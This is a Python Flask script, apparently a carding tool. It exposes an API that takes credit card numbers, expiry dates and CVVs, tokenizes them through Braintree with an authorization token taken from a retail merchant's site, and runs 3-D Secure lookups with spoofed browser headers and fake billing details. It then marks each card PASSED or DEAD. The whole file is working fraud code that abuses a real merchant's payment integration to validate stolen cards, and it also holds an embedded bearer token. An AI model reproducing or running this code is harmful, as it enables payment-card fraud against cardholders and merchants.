import requests
from flask import Flask, request, make_response
from flask_cors import CORS
from urllib.parse import unquote as url_unquote
import colorama
import json
colorama.init()
app = Flask(__name__)
CORS(app)

CLEAR_SCREEN = '\033[2J'
RED = '\033[31m'
RESET = '\033[0m'
BLUE = "\033[34m"
CYAN = "\033[36m"
GREEN = "\033[32m"
RESET = "\033[0m"
BOLD = "\033[m"
REVERSE = "\033[m"


def multiexplode(string):
    lista = str(string)
    if lista.__contains__('|'):
        final = lista.split('|')
        return final
    elif lista.__contains__(':'):
        final = lista.split(':')
        return final


def chk(lista):
    lista = lista.split('\n')[0]
    cc = multiexplode(lista)[0]
    mes = multiexplode(lista)[1]
    ano = multiexplode(lista)[2]
    cvv = multiexplode(lista)[3]
    try:
        url1 = "https://payments.braintree-api.com/graphql"
        data = {
            "clientSdkMetadata": {
                "source": "client",
                "integration": "custom",
                "sessionId": "95bd43b5-8dd8-4708-95aa-770d3a9ea1be"
            },
            "query": "mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }",
            "variables": {
                "input": {
                    "creditCard": {
                        "number": cc,
                        "expirationMonth": mes,
                        "expirationYear": ano,
                        "cvv": cvv,
                        "billingAddress": {
                            "postalCode": "E1 7AA"
                        }
                    },
                    "options": {
                        "validate": False
                    }
                }
            },
            "operationName": "TokenizeCreditCard"
        }
        headers = {
            'Authorization': 'Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiIsImtpZCI6IjIwMTgwNDI2MTYtcHJvZHVjdGlvbiIsImlzcyI6Imh0dHBzOi8vYXBpLmJyYWludHJlZWdhdGV3YXkuY29tIn0.eyJleHAiOjE2ODY3MjI0ODIsImp0aSI6IjliYzhjYzM4LWEzMDUtNGNmNi05YzlkLWE2NjdlNTg4NGM2ZiIsInN1YiI6InJoMmczNHh0Z3J6cG54YmgiLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6InJoMmczNHh0Z3J6cG54YmgiLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0IjpmYWxzZX0sInJpZ2h0cyI6WyJtYW5hZ2VfdmF1bHQiXSwic2NvcGUiOlsiQnJhaW50cmVlOlZhdWx0Il0sIm9wdGlvbnMiOnsibWVyY2hhbnRfYWNjb3VudF9pZCI6ImVrd2JVU0QifX0.rRzfHSB-goJCOuOnkFcqDoOY8OiHYuWm27u-BK2Fyp1Dt4n3WuoC9DT5yfpcf08ccpmi6aPLnrwrBOjywIr83g',
            'braintree-version': '2018-05-10',
            'Content-Type': 'application/json',
            'Origin': 'https://assets.braintreegateway.com',
            'Referer': 'https://assets.braintreegateway.com/',
            'Sec-Fetch-Dest': 'empty',
            'Sec-Fetch-Mode': 'cors',
            'Sec-Fetch-Site': 'cross-site',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36'
        }
        req1 = requests.post(url1, data=json.dumps(data), headers=headers)
        response_dict = req1.json()
        if response_dict['data']['tokenizeCreditCard']['token']:
            token = response_dict['data']['tokenizeCreditCard']['token']
            url2 = f'https://api.braintreegateway.com/merchants/rh2g34xtgrzpnxbh/client_api/v1/payment_methods/{token}/three_d_secure/lookup'
            data2 = '''{"amount":"26.71","additionalInfo":{"shippingGivenName":"","shippingSurname":"","shippingPhone":"","billingLine1":"newyork st","billingLine2":"","billingCity":"newyorks city","billingState":"","billingPostalCode":"10080","billingCountryCode":"US","billingPhoneNumber":"9098184561","billingGivenName":"john","billingSurname":"smith","shippingLine1":"","shippingLine2":"","shippingCity":"","shippingState":"","shippingPostalCode":"","shippingCountryCode":"US"},"dfReferenceId":"0_8b867996-04c5-497a-aff3-294748e4a6ea","clientMetadata":{"sdkVersion":"web/3.48.0","requestedThreeDSecureVersion":"2","cardinalDeviceDataCollectionTimeElapsed":1852},"authorizationFingerprint":"eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiIsImtpZCI6IjIwMTgwNDI2MTYtcHJvZHVjdGlvbiIsImlzcyI6Imh0dHBzOi8vYXBpLmJyYWludHJlZWdhdGV3YXkuY29tIn0.eyJleHAiOjE2ODY3MjI0ODIsImp0aSI6IjliYzhjYzM4LWEzMDUtNGNmNi05YzlkLWE2NjdlNTg4NGM2ZiIsInN1YiI6InJoMmczNHh0Z3J6cG54YmgiLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6InJoMmczNHh0Z3J6cG54YmgiLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0IjpmYWxzZX0sInJpZ2h0cyI6WyJtYW5hZ2VfdmF1bHQiXSwic2NvcGUiOlsiQnJhaW50cmVlOlZhdWx0Il0sIm9wdGlvbnMiOnsibWVyY2hhbnRfYWNjb3VudF9pZCI6ImVrd2JVU0QifX0.rRzfHSB-goJCOuOnkFcqDoOY8OiHYuWm27u-BK2Fyp1Dt4n3WuoC9DT5yfpcf08ccpmi6aPLnrwrBOjywIr83g","braintreeLibraryVersion":"braintree/web/3.48.0","_meta":{"merchantAppId":"www.ekwb.com","platform":"web","sdkVersion":"3.48.0","source":"client","integration":"custom","integrationType":"custom","sessionId":"95bd43b5-8dd8-4708-95aa-770d3a9ea1be"}}'''
            headers2 = {
                'Content-Type': 'application/json',
                "Origin": "https://www.ekwb.com",
                "Referer": "https://www.ekwb.com/",  # This is the site for api
                "Sec-Ch-Ua": '"Chromium";v="112", "Google Chrome";v="112", "Not:A-Brand";v="99"',
                "Sec-Ch-Ua-Mobile": "?0",
                "Sec-Ch-Ua-Platform": '"Windows"',
                "Sec-Fetch-Dest": "empty",
                "Sec-Fetch-Mode": "cors",
                "Sec-Fetch-Site": "cross-site",
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36"
            }
            req2 = requests.post(
                url2, data=data2, headers=headers2)
            response_dict2 = req2.json()
            status = response_dict2['paymentMethod']['threeDSecureInfo']['status']

            if status == 'authenticate_successful' or status == 'authenticate_attempt_successful':
                return f' PASSED ✅ =>   {lista}  Message =>  {status} - @predator_incoming  '
            else:
                return f' DEAD ❌ =>   {lista}  Message =>  {status} - @predator_incoming  '
        else:
            return f' DEAD ❌ =>   {lista}  Message =>  Token has expired , Please inform the owner - @predator_incoming  '
    except:
        return f' DEAD ❌ =>   {lista}  Message =>  Something went wrong :??  '


@ app.route('/api', methods=['GET'])
def handle_request():
    lista = request.args.get("lista")
    lista = url_unquote(lista)
    response = chk(lista)
    print(response)
    response = make_response(response)
    return response


if __name__ == "__main__":
    app.run(host='0.0.0.0')
